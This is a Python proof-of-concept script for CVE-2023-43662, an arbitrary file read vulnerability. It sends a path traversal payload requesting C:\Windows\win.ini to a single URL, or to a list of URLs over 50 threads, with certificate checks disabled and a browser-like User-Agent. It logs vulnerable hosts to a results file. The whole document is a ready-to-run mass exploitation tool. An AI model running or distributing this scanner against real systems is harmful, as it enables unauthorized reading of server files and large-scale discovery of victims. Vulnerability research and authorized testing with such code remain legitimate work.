import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """ _____ _   _ _____       _____  _____  _____  _____          ___  _____  ____   ____  _____ 
/  __ \ | | |  ___|     / __  \|  _  |/ __  \|____ |        /   ||____ |/ ___| / ___|/ __  \
| /  \/ | | | |__ ______`' / /'| |/' |`' / /'    / /______ / /| |    / / /___ / /___ `' / /'
| |   | | | |  __|______| / /  |  /| |  / /      \ \______/ /_| |    \ \ ___ \| ___ \  / /  
| \__/\ \_/ / |___      ./ /___\ |_/ /./ /___.___/ /      \___  |.___/ / \_/ || \_/ |./ /___
 \____/\___/\____/      \_____/ \___/ \_____/\____/           |_/\____/\_____/\_____/\_____/
                                                                                            
                                                                                            

"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="CVE-2023-43662")
    parser.add_argument('-u','-url',dest='url',type=str,help="Please input your URL")
    parser.add_argument('-f','-file',dest='file',type=str,help="Please input your File path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/api/Image/withpath/C:\Windows\win.ini"
    headers = {     
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
    }
    try:
        res1 = requests.get(url=target+payload,headers=headers,verify=False,timeout=5)
        # print(res1.text)
        if res1.status_code == 200 and 'files' in res1.text:
            print(f"[+]{target}存在任意文件读取漏洞")
            with open('result.txt','a')as f:
                f.write(target+'\n')
        else:
                print(f"[-]{target}不存在任意文件读取漏洞")
    except Exception as e:
        print(f"Exception occurred: {e}")
if __name__ == "__main__":
    main()
